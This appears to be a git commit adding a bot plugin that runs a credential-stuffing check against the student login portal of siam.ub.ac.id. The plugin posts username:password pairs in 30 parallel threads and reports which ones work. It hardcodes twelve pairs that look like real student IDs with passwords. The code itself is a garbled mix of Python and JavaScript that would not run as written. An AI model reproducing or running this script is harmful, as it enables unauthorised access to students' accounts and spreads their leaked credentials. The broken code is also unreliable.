0ca5464f3eb902389f14788cd4962c294f614768
Afdhan <77567725+Afdhan@users.noreply.github.com>
2021-03-15 00:46:35 +0700

    Add files via upload

---
+++ plugins/tess.js
@@ -0,0 +1,42 @@
+let list = ${(global.ube)}
+        with open(list, 'r') as file = {
+let lines = file.readlines()
+        with ThreadPoolExecutor(max_workers: 30) as crot = {
+                for line in lines:
+                    data = line.strip()
+                    user = data.split(':')[0] 
+                    pswd = data.split(':')[1]
+                    crot.submit(ub, user, pswd)
+}
+
+if ub (usr, pwd):
+let url = 'https://siam.ub.ac.id/'
+let dat = {
+'usr':'username'
+'pwd':'password'
+'submit':'login'
+}
+let raw = req.post(url, data: dat, verify: false, timeout: 10).text
+let res = bs(raw, 'html.parser').title.get_text()
+if res == 'Sistem Informasi Akademik Mahasiswa' {
+            console.log = ("AKTIF ${usr}:${pwd}")
+        m.reply('AKTIF ${usr}:${pwd}')
+    else:
+           console.log = ("MODAR ${usr}:${pwd}")
+       m.reply('MODAR ${usr}:${pwd}')
+}
+
+global.ube [
+'195030107111024:Allisya123',
+'183141514111026:endah123',
+'185020300111086:yunita123',
+'185080300111030:faizan123',
+'185080301111020:adellia123',
+'185080307111002:azarine123',
+'175080301111038:yusuf123',
+'203140914111085:rafly123',
+'203140914111060:gayuh12345',
+'203140914111065:ichsan12345',
+'205080400113037:sinta123',
+'205080407113032:fardhian123',
+]
